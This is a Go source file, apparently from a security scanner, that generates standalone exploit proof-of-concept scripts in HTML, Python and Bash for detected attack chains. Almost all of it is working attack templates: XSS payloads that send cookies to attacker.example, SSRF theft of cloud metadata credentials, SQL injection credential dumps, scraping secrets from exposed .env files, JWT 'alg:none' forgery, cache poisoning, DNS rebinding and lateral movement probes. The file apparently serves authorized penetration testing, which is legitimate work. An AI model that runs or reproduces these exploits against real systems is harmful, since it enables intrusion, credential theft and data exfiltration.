package report

import (
	"fmt"
	"strings"

	"github.com/stormbane-security/beacon/internal/finding"
)

// GenerateChainPoC creates a standalone exploit proof-of-concept for an attack
// chain. Returns (content, filename, language) where language is "html",
// "python", "bash", etc.
func GenerateChainPoC(chainFinding finding.Finding, allFindings []finding.Finding) (string, string, string) {
	id := string(chainFinding.CheckID)
	safe := sanitizeFilename(chainFinding.Asset)

	switch id {
	case "correlation.session_hijack_chain":
		return chainPoCSessionHijack(chainFinding, allFindings),
			fmt.Sprintf("chain-session-hijack-%s.html", safe), "html"

	case "chain.ssrf_to_cloud_creds":
		return chainPoCSSRFToCloud(chainFinding, allFindings),
			fmt.Sprintf("chain-ssrf-cloud-%s.py", safe), "python"

	case "chain.sqli_to_credential_dump":
		return chainPoCSQLiDump(chainFinding, allFindings),
			fmt.Sprintf("chain-sqli-dump-%s.py", safe), "python"

	case "chain.env_to_database_access":
		return chainPoCEnvToDatabase(chainFinding, allFindings),
			fmt.Sprintf("chain-env-db-%s.sh", safe), "bash"

	case "chain.default_creds_to_admin_access":
		return chainPoCDefaultCreds(chainFinding, allFindings),
			fmt.Sprintf("chain-default-creds-%s.sh", safe), "bash"

	case "chain.xss_to_session_theft_poc":
		return chainPoCXSSSessionTheft(chainFinding, allFindings),
			fmt.Sprintf("chain-xss-session-%s.html", safe), "html"

	case "correlation.credential_theft_chain":
		return chainPoCCredentialTheft(chainFinding, allFindings),
			fmt.Sprintf("chain-cred-theft-%s.sh", safe), "bash"

	case "correlation.full_compromise_chain":
		return chainPoCFullCompromise(chainFinding, allFindings),
			fmt.Sprintf("chain-full-compromise-%s.py", safe), "python"

	case "correlation.lateral_movement_chain":
		return chainPoCLateralMovement(chainFinding, allFindings),
			fmt.Sprintf("chain-lateral-%s.py", safe), "python"

	case "correlation.cache_poisoning_chain":
		return chainPoCCachePoison(chainFinding, allFindings),
			fmt.Sprintf("chain-cache-poison-%s.sh", safe), "bash"

	case "correlation.dns_rebinding_chain":
		return chainPoCDNSRebinding(chainFinding, allFindings),
			fmt.Sprintf("chain-dns-rebind-%s.html", safe), "html"

	case "correlation.auth_bypass_chain":
		return chainPoCAuthBypass(chainFinding, allFindings),
			fmt.Sprintf("chain-auth-bypass-%s.py", safe), "python"

	default:
		return chainPoCDefault(chainFinding, allFindings),
			fmt.Sprintf("chain-%s-%s.sh", sanitizeFilename(id), safe), "bash"
	}
}

func chainPoCSessionHijack(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	corsURL := evi(cf, "url", "https://"+asset)
	xssURL := evi(cf, "xss_url", "")
	xssParam := evi(cf, "parameter", "q")

	if xssURL == "" {
		if xf := findByCheckPrefix(asset, "web.xss", all); xf != nil {
			xssURL = evi(*xf, "url", "https://"+asset+"/search")
			xssParam = evi(*xf, "parameter", xssParam)
		} else {
			xssURL = "https://" + asset + "/search"
		}
	}

	return fmt.Sprintf(`<!-- Session Hijack PoC - CORS + XSS + Cookie Theft -->
<!-- Target: %s -->
<!-- %s -->
<html>
<head><title>Session Hijack PoC - %s</title></head>
<body>
<h1>Session Hijack PoC</h1>
<p>This page demonstrates the CORS + XSS + Cookie theft attack chain against <code>%s</code>.</p>

<h2>Step 1: XSS Injection</h2>
<p>The following URL triggers XSS via the <code>%s</code> parameter:</p>
<pre>%s?%s=&lt;script&gt;...&lt;/script&gt;</pre>

<h2>Step 2: Cookie Theft via CORS</h2>
<button onclick="runPoC()">Run PoC</button>
<pre id="result">Click button to start...</pre>

<script>
// Step 1: Exploit XSS to inject script
var xssPayload = '<script>new Image().src="https://attacker.example/steal?c="+document.cookie<\/script>';

// Step 2: The CORS policy at %s allows cross-origin credentialed requests
function runPoC() {
    var output = document.getElementById('result');
    output.textContent = 'Sending cross-origin credentialed request to %s ...\n';

    fetch('%s', {
        credentials: 'include'
    }).then(function(r) {
        var acao = r.headers.get('Access-Control-Allow-Origin');
        var acac = r.headers.get('Access-Control-Allow-Credentials');
        output.textContent += 'ACAO: ' + acao + '\n';
        output.textContent += 'ACAC: ' + acac + '\n';
        if (acac === 'true') {
            output.textContent += '\n[!] CORS allows credentialed cross-origin requests!\n';
            output.textContent += '[!] Combined with XSS at %s, session cookies can be stolen.\n';
        }
        return r.text();
    }).then(function(body) {
        output.textContent += '\nResponse length: ' + body.length + ' bytes\n';
    }).catch(function(err) {
        output.textContent += 'Error: ' + err + '\n';
    });
}
</script>
</body>
</html>
`, asset, pocDisclaimer, asset, asset, xssParam, xssURL, xssParam, corsURL, corsURL, corsURL, xssURL)
}

func chainPoCSSRFToCloud(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	ssrfURL := evi(cf, "url", "https://"+asset+"/api/fetch")
	param := evi(cf, "parameter", "url")
	provider := evi(cf, "cloud_provider", "AWS")
	role := evi(cf, "iam_role", "ec2-instance-role")

	metaURL := "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
	if strings.EqualFold(provider, "gcp") {
		metaURL = "http://metadata.google.internal/computeMetadata/v1/"
	} else if strings.EqualFold(provider, "azure") {
		metaURL = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
	}

	return fmt.Sprintf(`#!/usr/bin/env python3
"""
SSRF to %s Cloud Credential Theft PoC
Target: %s
%s
"""

import requests
import json
import sys

TARGET = "%s"
PARAM = "%s"
METADATA_BASE = "%s"
IAM_ROLE = "%s"

def ssrf_fetch(internal_url):
    """Use the SSRF vulnerability to fetch an internal URL."""
    resp = requests.get(TARGET, params={PARAM: internal_url}, timeout=15)
    return resp

def main():
    print(f"[*] SSRF → Cloud Credential Theft PoC")
    print(f"[*] Target: {TARGET}")
    print(f"[*] SSRF parameter: {PARAM}")
    print()

    # Step 1: Discover IAM role via SSRF
    print("[*] Step 1: Fetching IAM role via SSRF...")
    try:
        r = ssrf_fetch(METADATA_BASE)
        discovered_role = r.text.strip()
        print(f"[+] IAM Role: {discovered_role}")
    except Exception as e:
        print(f"[-] Failed: {e}")
        discovered_role = IAM_ROLE
        print(f"[*] Using expected role: {discovered_role}")

    print()

    # Step 2: Fetch temporary credentials
    print("[*] Step 2: Fetching credentials for role...")
    cred_url = METADATA_BASE + discovered_role
    try:
        r = ssrf_fetch(cred_url)
        creds = r.json()
        print(f"[+] AccessKeyId: {creds.get('AccessKeyId', 'N/A')}")
        print(f"[+] SecretAccessKey: {creds.get('SecretAccessKey', 'N/A')[:8]}...")
        print(f"[+] Token: {creds.get('Token', 'N/A')[:20]}...")
        print(f"[+] Expiration: {creds.get('Expiration', 'N/A')}")
    except Exception as e:
        print(f"[-] Failed to parse credentials: {e}")
        print(f"    Raw response: {r.text[:200]}")

    print()
    print("[*] Step 3: To use these credentials:")
    print("    export AWS_ACCESS_KEY_ID=<AccessKeyId>")
    print("    export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>")
    print("    export AWS_SESSION_TOKEN=<Token>")
    print("    aws sts get-caller-identity")
    print("    aws s3 ls")

if __name__ == "__main__":
    main()
`, provider, asset, pocDisclaimer, ssrfURL, param, metaURL, role)
}

func chainPoCSQLiDump(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	url := evi(cf, "url", "https://"+asset)
	param := evi(cf, "parameter", "id")
	payload := evi(cf, "payload", "' UNION SELECT username,password FROM users--")

	return fmt.Sprintf(`#!/usr/bin/env python3
"""
SQL Injection to Credential Dump PoC
Target: %s
%s
"""

import requests
import sys

TARGET = "%s"
PARAM = "%s"
BASE_PAYLOAD = """%s"""

def main():
    print("[*] SQLi → Credential Dump PoC")
    print(f"[*] Target: {TARGET}")
    print(f"[*] Parameter: {PARAM}")
    print()

    # Step 1: Confirm injection
    print("[*] Step 1: Confirming SQL injection...")
    try:
        r = requests.get(TARGET, params={PARAM: "1' AND '1'='1"}, timeout=15)
        r_false = requests.get(TARGET, params={PARAM: "1' AND '1'='2"}, timeout=15)
        if len(r.text) != len(r_false.text):
            print(f"[+] Boolean-based SQLi confirmed (true={len(r.text)}b, false={len(r_false.text)}b)")
        else:
            print(f"[*] Response lengths match; trying UNION-based extraction")
    except Exception as e:
        print(f"[-] Error: {e}")

    print()

    # Step 2: Extract table names
    print("[*] Step 2: Enumerating tables...")
    table_payload = "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--"
    try:
        r = requests.get(TARGET, params={PARAM: table_payload}, timeout=15)
        print(f"[*] Response ({len(r.text)} bytes): {r.text[:300]}")
    except Exception as e:
        print(f"[-] Error: {e}")

    print()

    # Step 3: Dump credentials
    print("[*] Step 3: Dumping credentials...")
    try:
        r = requests.get(TARGET, params={PARAM: BASE_PAYLOAD}, timeout=15)
        print(f"[+] Response ({len(r.text)} bytes):")
        print(r.text[:500])
    except Exception as e:
        print(f"[-] Error: {e}")

    print()
    print("[*] For automated extraction, use:")
    print(f'    sqlmap -u "{TARGET}?{PARAM}=1" --batch --dump')

if __name__ == "__main__":
    main()
`, asset, pocDisclaimer, url, param, payload)
}

func chainPoCEnvToDatabase(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	envPath := evi(cf, "path", "/.env")
	dbHost := evi(cf, "pivot_target", "db.internal")
	dbPort := evi(cf, "pivot_port", "5432")

	return fmt.Sprintf(`#!/bin/bash
# .env → Database Access PoC
# Target: %s
# %s

set -e

TARGET="https://%s%s"
DB_HOST="%s"
DB_PORT="%s"

echo "[*] .env → Database Access PoC"
echo "[*] Target: $TARGET"
echo

# Step 1: Fetch the exposed .env file
echo "[*] Step 1: Fetching exposed .env file..."
ENV_CONTENT=$(curl -sk "$TARGET")
echo "$ENV_CONTENT" | head -20
echo

# Step 2: Parse database credentials
echo "[*] Step 2: Parsing database credentials..."
DB_URL=$(echo "$ENV_CONTENT" | grep -iE "DATABASE_URL|DB_HOST|DB_PASSWORD" | head -5)
echo "    Found: $DB_URL"
echo

# Step 3: Attempt database connection
echo "[*] Step 3: Connection commands:"
echo "    PostgreSQL: psql -h $DB_HOST -p $DB_PORT -U <user> <dbname>"
echo "    MySQL:      mysql -h $DB_HOST -P $DB_PORT -u <user> -p <dbname>"
echo "    MongoDB:    mongosh mongodb://<user>:<pass>@$DB_HOST:$DB_PORT/<dbname>"
echo
echo "[!] Parse the credentials from the .env output above and substitute into the connection command."
`, asset, pocDisclaimer, asset, envPath, dbHost, dbPort)
}

func chainPoCDefaultCreds(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	url := evi(cf, "url", "https://"+asset+"/admin")
	username := evi(cf, "username", "admin")
	password := evi(cf, "password", "admin")
	service := evi(cf, "service", "admin panel")

	return fmt.Sprintf(`#!/bin/bash
# Default Credentials → Admin Access PoC
# Target: %s (%s)
# %s

set -e

TARGET="%s"
USERNAME="%s"
PASSWORD="%s"

echo "[*] Default Credentials → Admin Access PoC"
echo "[*] Service: %s at $TARGET"
echo

# Step 1: Attempt login with default credentials
echo "[*] Step 1: Logging in with $USERNAME:$PASSWORD..."
RESPONSE=$(curl -sk -c /tmp/beacon-poc-cookies.txt \
    -d "username=$USERNAME&password=$PASSWORD" \
    -w "\n%%{http_code}" \
    "$TARGET/login" 2>/dev/null)

HTTP_CODE=$(echo "$RESPONSE" | tail -1)
echo "    HTTP Status: $HTTP_CODE"

# Step 2: Access admin panel with session
echo
echo "[*] Step 2: Accessing admin panel..."
ADMIN_RESPONSE=$(curl -sk -b /tmp/beacon-poc-cookies.txt \
    -w "%%{http_code}" \
    "$TARGET" 2>/dev/null)
echo "    Admin panel status: $ADMIN_RESPONSE"

echo
echo "[*] Manual verification:"
echo "    1. Open $TARGET in a browser"
echo "    2. Login with $USERNAME / $PASSWORD"
echo "    3. Verify admin access"

# Cleanup
rm -f /tmp/beacon-poc-cookies.txt
`, asset, service, pocDisclaimer, url, username, password, service)
}

func chainPoCXSSSessionTheft(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	url := evi(cf, "url", "https://"+asset)
	param := evi(cf, "parameter", "q")

	return fmt.Sprintf(`<!-- XSS → Session Theft PoC -->
<!-- Target: %s -->
<!-- %s -->
<html>
<head><title>XSS Session Theft PoC - %s</title></head>
<body>
<h1>XSS to Session Theft PoC</h1>
<p>Target: <code>%s</code></p>
<p>Vulnerable parameter: <code>%s</code></p>

<h2>Step 1: XSS Payload</h2>
<p>The following URL injects JavaScript that steals session cookies:</p>
<pre id="payload-url"></pre>

<h2>Step 2: Simulated Cookie Capture</h2>
<pre id="result">Waiting...</pre>

<script>
var target = "%s";
var param = "%s";

// Build the XSS payload URL
var stealScript = 'new Image().src="https://attacker.example/steal?c="+document.cookie';
var payloadURL = target + '?' + param + '=' + encodeURIComponent('<script>' + stealScript + '<\/script>');
document.getElementById('payload-url').textContent = payloadURL;

// Demonstrate the cookie-reading step (same-origin simulation)
var output = document.getElementById('result');
output.textContent = 'Cookies readable by JavaScript:\n';
if (document.cookie) {
    output.textContent += document.cookie + '\n';
    output.textContent += '\n[!] HttpOnly flag is missing — cookies are accessible to XSS.\n';
} else {
    output.textContent += '(no cookies set on this origin)\n';
    output.textContent += '\nOn the target, session cookies without HttpOnly would appear here.\n';
}
output.textContent += '\nThe XSS payload at the URL above would:\n';
output.textContent += '1. Execute in the victim\'s browser context\n';
output.textContent += '2. Read document.cookie\n';
output.textContent += '3. Send cookies to attacker.example\n';
</script>
</body>
</html>
`, asset, pocDisclaimer, asset, url, param, url, param)
}

func chainPoCCredentialTheft(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	path := evi(cf, "path", "/.env")
	grantTarget := evi(cf, "grants_access_to", "backend service")

	return fmt.Sprintf(`#!/bin/bash
# Credential Theft via Exposed Configuration PoC
# Target: %s
# %s

set -e

TARGET="https://%s%s"

echo "[*] Credential Theft PoC"
echo "[*] Target: $TARGET"
echo

# Step 1: Fetch the exposed configuration
echo "[*] Step 1: Fetching exposed configuration..."
CONTENT=$(curl -sk "$TARGET")
echo "$CONTENT" | head -30
echo

# Step 2: Extract credentials
echo "[*] Step 2: Extracting credentials..."
echo "$CONTENT" | grep -iE "(password|secret|key|token|credentials|database_url|api_key)" | head -10
echo

# Step 3: Usage
echo "[*] Step 3: Use extracted credentials to access: %s"
echo "[*] Parse the output above and connect to the target service."
`, asset, pocDisclaimer, asset, path, grantTarget)
}

func chainPoCFullCompromise(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	url := evi(cf, "url", "https://"+asset)
	param := evi(cf, "parameter", "id")
	dbHost := evi(cf, "pivot_target", "db.internal")

	return fmt.Sprintf(`#!/usr/bin/env python3
"""
Full Compromise Chain PoC
Target: %s
%s
"""

import requests
import sys

TARGET = "%s"
PARAM = "%s"
DB_HOST = "%s"

def main():
    print("[*] Full Compromise Chain PoC")
    print(f"[*] Target: {TARGET}")
    print()

    # Step 1: Exploit entry point
    print("[*] Step 1: Exploiting entry point...")
    try:
        r = requests.get(TARGET, params={PARAM: "' OR 1=1--"}, timeout=15)
        print(f"[*] Response: HTTP {r.status_code} ({len(r.text)} bytes)")
    except Exception as e:
        print(f"[-] Error: {e}")

    print()

    # Step 2: Pivot to backend
    print("[*] Step 2: Pivoting to backend at {DB_HOST}...")
    print(f"    The entry point vulnerability provides access to {DB_HOST}")
    print(f"    via extracted credentials or SSRF.")

    print()

    # Step 3: Data exfiltration
    print("[*] Step 3: Data exfiltration commands:")
    print(f"    sqlmap -u '{TARGET}?{PARAM}=1' --batch --dump")
    print(f"    Or connect directly: psql -h {DB_HOST} -U <user> <db>")

if __name__ == "__main__":
    main()
`, asset, pocDisclaimer, url, param, dbHost)
}

func chainPoCLateralMovement(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	url := evi(cf, "url", "https://"+asset)
	pivotTarget := evi(cf, "pivot_target", "internal-host")
	pivotPort := evi(cf, "pivot_port", "6379")
	service := evi(cf, "service", "exposed service")

	return fmt.Sprintf(`#!/usr/bin/env python3
"""
Lateral Movement PoC
Target: %s → %s:%s
%s
"""

import requests
import sys

ENTRY_POINT = "%s"
PIVOT_TARGET = "%s"
PIVOT_PORT = "%s"

def main():
    print("[*] Lateral Movement PoC")
    print(f"[*] Entry: {ENTRY_POINT}")
    print(f"[*] Pivot target: {PIVOT_TARGET}:{PIVOT_PORT}")
    print()

    # Step 1: Access unauthenticated service
    print("[*] Step 1: Accessing %s...")
    try:
        r = requests.get(ENTRY_POINT, timeout=15)
        print(f"[+] Status: {r.status_code} ({len(r.text)} bytes)")
    except Exception as e:
        print(f"[-] Error: {e}")

    print()

    # Step 2: Probe internal target via SSRF or service features
    print("[*] Step 2: Probing internal target...")
    internal_urls = [
        f"http://{PIVOT_TARGET}:{PIVOT_PORT}/",
        f"http://{PIVOT_TARGET}:{PIVOT_PORT}/info",
    ]
    for u in internal_urls:
        try:
            r = requests.get(ENTRY_POINT, params={"url": u}, timeout=10)
            print(f"[*] {u} → HTTP {r.status_code} ({len(r.text)} bytes)")
        except Exception as e:
            print(f"[-] {u} → {e}")

    print()
    print("[*] If internal responses are returned, lateral movement is confirmed.")

if __name__ == "__main__":
    main()
`, asset, pivotTarget, pivotPort, pocDisclaimer, url, pivotTarget, pivotPort, service)
}

func chainPoCCachePoison(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	url := evi(cf, "url", "https://"+asset)
	header := evi(cf, "unkeyed_header", "X-Forwarded-Host")

	return fmt.Sprintf(`#!/bin/bash
# Cache Poisoning Chain PoC
# Target: %s
# %s

set -e

TARGET="%s"
HEADER="%s"
EVIL="evil.attacker.example"

echo "[*] Cache Poisoning Chain PoC"
echo "[*] Target: $TARGET"
echo "[*] Unkeyed header: $HEADER"
echo

# Step 1: Send poisoned request
echo "[*] Step 1: Sending poisoned request..."
POISONED=$(curl -sk -D - -H "$HEADER: $EVIL" "$TARGET")
echo "$POISONED" | head -20
echo

# Step 2: Verify cache accepted it
echo "[*] Step 2: Checking if cache is poisoned (request without header)..."
sleep 2
CACHED=$(curl -sk "$TARGET")
if echo "$CACHED" | grep -q "$EVIL"; then
    echo "[!] CONFIRMED: Cache poisoning successful!"
    echo "[!] The evil value '$EVIL' appears in the cached response."
else
    echo "[-] Evil value not found in cached response."
    echo "[-] May need multiple attempts or different timing."
fi

echo
echo "[*] If poisoning succeeds, all users receive the malicious response until cache expires."
`, asset, pocDisclaimer, url, header)
}

func chainPoCDNSRebinding(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	internalIP := evi(cf, "pivot_target", "127.0.0.1")
	internalPort := evi(cf, "pivot_port", "80")

	return fmt.Sprintf(`<!-- DNS Rebinding Attack PoC -->
<!-- Target: %s → %s:%s -->
<!-- %s -->
<html>
<head><title>DNS Rebinding PoC - %s</title></head>
<body>
<h1>DNS Rebinding PoC</h1>
<p>Target domain: <code>%s</code></p>
<p>Internal target: <code>%s:%s</code></p>

<h2>How This Attack Works</h2>
<ol>
    <li>This page is served from a domain controlled by the attacker</li>
    <li>The attacker's DNS server initially resolves to the attacker's IP</li>
    <li>After the page loads, DNS rebinds to <code>%s</code></li>
    <li>Subsequent fetch() calls reach the internal service</li>
</ol>

<h2>Rebinding Status</h2>
<pre id="result">Waiting for DNS rebind...</pre>

<script>
// In a real attack, the attacker's DNS server would rebind this domain
// to the internal IP after a short TTL expiry.
var internalTarget = "http://%s:%s/";

// After DNS rebind, this fetch goes to the internal service
function attemptRebind() {
    var output = document.getElementById('result');
    output.textContent = 'Attempting to reach internal service...\n';

    // This would work after DNS rebinding occurs
    fetch(internalTarget)
        .then(function(r) { return r.text(); })
        .then(function(body) {
            output.textContent += '[!] Internal service reached!\n';
            output.textContent += 'Response: ' + body.substring(0, 500) + '\n';
        })
        .catch(function(err) {
            output.textContent += 'Blocked by browser (expected without actual DNS rebind):\n';
            output.textContent += err + '\n';
            output.textContent += '\nTo execute this attack:\n';
            output.textContent += '1. Set up a rebinding DNS server (e.g., rbndr.us)\n';
            output.textContent += '2. Configure it to alternate between your IP and %s\n';
            output.textContent += '3. Serve this page from the rebinding domain\n';
        });
}

setTimeout(attemptRebind, 1000);
</script>
</body>
</html>
`, asset, internalIP, internalPort, pocDisclaimer, asset, asset,
		internalIP, internalPort, internalIP, internalIP, internalPort, internalIP)
}

func chainPoCAuthBypass(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	url := evi(cf, "url", "https://"+asset)
	method := evi(cf, "injection_vector", "JWT algorithm confusion")

	return fmt.Sprintf(`#!/usr/bin/env python3
"""
Authentication Bypass Chain PoC
Target: %s
Method: %s
%s
"""

import requests
import json
import base64
import hmac
import hashlib
import sys

TARGET = "%s"

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def forge_none_token(claims):
    """Forge a JWT with alg:none to bypass authentication."""
    header = {"alg": "none", "typ": "JWT"}
    h = b64url_encode(json.dumps(header).encode())
    p = b64url_encode(json.dumps(claims).encode())
    return f"{h}.{p}."

def main():
    print("[*] Authentication Bypass PoC")
    print(f"[*] Target: {TARGET}")
    print(f"[*] Method: %s")
    print()

    # Step 1: Forge an admin token
    print("[*] Step 1: Forging admin token...")
    admin_claims = {
        "sub": "1",
        "username": "admin",
        "role": "admin",
        "admin": True,
    }
    token = forge_none_token(admin_claims)
    print(f"[+] Forged token: {token[:50]}...")
    print()

    # Step 2: Access protected endpoint
    print("[*] Step 2: Accessing admin endpoint...")
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.get(TARGET, headers=headers, timeout=15)
        print(f"[*] Status: {r.status_code}")
        print(f"[*] Response: {r.text[:300]}")
        if r.status_code < 400:
            print("[!] Authentication bypass may be successful!")
    except Exception as e:
        print(f"[-] Error: {e}")

    print()
    print("[*] Manual test:")
    print(f"    curl -sk -H 'Authorization: Bearer {token}' '{TARGET}'")

if __name__ == "__main__":
    main()
`, asset, method, pocDisclaimer, url, method)
}

func chainPoCDefault(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	url := evi(cf, "url", "https://"+asset)
	proofCmd := cf.ProofCommand
	if proofCmd == "" {
		proofCmd = fmt.Sprintf("echo 'Manual verification required for %s on %s'", cf.CheckID, asset)
	}

	return fmt.Sprintf(`#!/bin/bash
# Attack Chain PoC: %s
# Target: %s
# Check ID: %s
# %s

set -e

echo "[*] Attack Chain PoC: %s"
echo "[*] Target: %s"
echo

# Proof command from beacon:
%s
`, cf.Title, asset, cf.CheckID, pocDisclaimer, cf.Title, url, proofCmd)
}
